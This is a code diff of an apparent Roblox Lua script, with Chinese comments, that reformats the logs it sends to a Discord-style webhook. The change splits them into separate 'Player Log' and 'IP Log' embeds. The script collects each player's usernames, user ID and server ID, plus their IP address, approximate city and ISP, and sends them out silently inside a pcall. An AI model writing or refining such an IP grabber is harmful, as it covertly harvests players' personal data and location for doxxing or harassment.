@@ -62,8 +62,8 @@ pcall(function()
     -- 3. 建立個人資料連結
     local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"
 
-    -- 4. 準備 embed 的 description，只包含玩家資訊
-    local description = string.format(
+    -- 4. 準備第一個 embed (玩家資訊)
+    local playerDescription = string.format(
         "**真實名稱:** `%s`\n" ..
         "**顯示名稱:** `%s`\n" ..
         "**玩家ID:** `%s`\n" ..
@@ -79,37 +79,47 @@ pcall(function()
         #Players:GetPlayers(),
         game.JobId or "N/A"
     )
+    
+    local playerEmbed = {
+        title = "Player Log:",
+        description = playerDescription,
+        color = embedColor,
+        footer = {
+            text = "三眼怪 ON TOP"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
 
-    -- 5. 將 IP 資訊附加到 description 的末尾，並使用大字標題
+    -- 5. 準備一個 embeds 陣列，並將第一個 embed 加入
+    local embeds = { playerEmbed }
+
+    -- 6. 如果有 IP 資訊，則創建第二個 embed (IP 資訊) 並加入陣列
     if secretInfo and secretInfo.ip then
         local ip_info = secretInfo.details
         local location = (ip_info and ip_info.country and ip_info.city) and (ip_info.country .. ", " .. ip_info.city) or "未知"
         local isp = (ip_info and ip_info.org) or "未知"
         
-        -- 使用 '##' 標題語法來讓 'IP Log:' 變大
-        local secretBlock = string.format(
-            "\n\n## IP Log:\n" ..
+        local ipDescription = string.format(
             "**IP 位址:** `%s`\n" ..
             "**推測位置:** `%s`\n" ..
             "**網路供應商:** `%s`",
             secretInfo.ip, location, isp
         )
-        description = description .. secretBlock
+
+        local ipEmbed = {
+            title = "IP Log:", -- 這裡的 title 會和上面的 Player Log 一樣大
+            description = ipDescription,
+            color = embedColor -- 保持顏色一致
+        }
+        
+        table.insert(embeds, ipEmbed)
     end
 
-    -- 6. 構建並發送最終的 webhook 資料
+    -- 7. 構建並發送最終的 webhook 資料
     local data = {
         username = "三眼怪 Log V2",
         avatar_url = appIconURL,
-        embeds = {{
-            -- title 留空，讓 description 成為主要內容
-            description = description,
-            color = embedColor,
-            footer = {
-                text = "三眼怪 ON TOP"
-            },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
+        embeds = embeds -- 將包含一個或兩個 embed 的陣列發送出去
     }
 
     secureRequest({
